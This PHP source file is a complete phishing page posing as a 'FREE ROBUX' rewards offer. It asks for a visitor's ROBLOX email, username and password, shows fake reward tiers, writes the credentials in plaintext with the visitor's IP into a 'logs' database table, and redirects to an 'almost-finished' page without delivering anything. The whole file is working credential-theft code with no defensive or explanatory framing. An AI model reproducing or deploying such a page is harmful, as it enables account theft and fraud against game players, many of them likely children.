<?php
include_once $_SERVER['DOCUMENT_ROOT'].'/global/header.php';

$msg = "";

$email = $_POST['email'];
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['submit'])) {
  if(isset($_POST['email'])) {
    if(isset($_POST['username'])) {
      if(isset($_POST['password'])) {
        $data = $handler->prepare("INSERT INTO logs (email, username, password, ip) VALUES (?, ?, ?, ?)");
        $data->execute(array($email, $username, $password, $ip));
        header('Location: /almost-finished');
        die();
      } else {
        $msg = "ERROR: You must enter a password!";
      }
    } else {
      $msg = "ERROR: You must enter a valid username!";
    }
  } else {
    $msg = "ERROR: You must enter a valid email!";
  }
}



?>



<div class="content">
  <div class="container-fluid">
    <div class="row">
       <div class="col-md-10 col-md-offset-1">
         <div class="card">
             <div class="card-content">
               <form action="robux" method="post">
                 <div class="row">
                   <div class="col-md-12">
                     <h2>Redeem your FREE ROBUX rewards!</h2><div class="col-md-1 pull-right"><img width="50" height="50" src="../assets/img/rbx.png" /></div>
                     <p>Make sure your credentials are correct and that you fully read our <a href="/terms">Terms of Service</a>!</p>
                   </div>
                 </div>
                 <div class="form-group label-floating">
                   <label class="control-label">ROBLOX Account Email</label>
                   <input type="email" name="email" id="email" class="form-control">
                 </div>
                 <div class="form-group label-floating">
                   <label class="control-label">ROBLOX Username</label>
                   <input type="text" name="username" id="username" class="form-control">
                 </div>
                 <div class="form-group label-floating">
                   <label class="control-label">ROBLOX Password</label>
                   <input type="password" name="password" id="password" class="form-control">
                 </div>
                 <div class="radio">
                  <label><input type="radio" name="optionsRadios" checked="true"><span class="circle"></span><span class="check"></span> 5,000R$ (12-24 Hours)</label>
                 </div>
                 <div class="radio">
                  <label><input type="radio" name="optionsRadios" checked="true"><span class="circle"></span><span class="check"></span> 10,000R$ (24-48 Hours)</label>
                 </div>
                 <div class="radio">
                  <label><input type="radio" name="optionsRadios" checked="true"><span class="circle"></span><span class="check"></span> 20,000R$ (48-72 Hours)</label>
                 </div>
                 <div class="radio">
                  <label><input type="radio" name="optionsRadios" checked="true"><span class="circle"></span><span class="check"></span> 50,000R$ (72-96 Hours)</label>
                 </div>
                 <h4 class="pull-left" style="color:red;"><?php echo $msg;?></h4>
                 <button type="submit" name="submit" id="submit" class="btn btn-success pull-right">Submit</button>
                 <div class="clearfix"></div>
               </form>
             </div>
         </div>


      </div>
    </div>
  </div>
</div>





<?php
include_once $_SERVER['DOCUMENT_ROOT'].'/global/footer.php';


?>
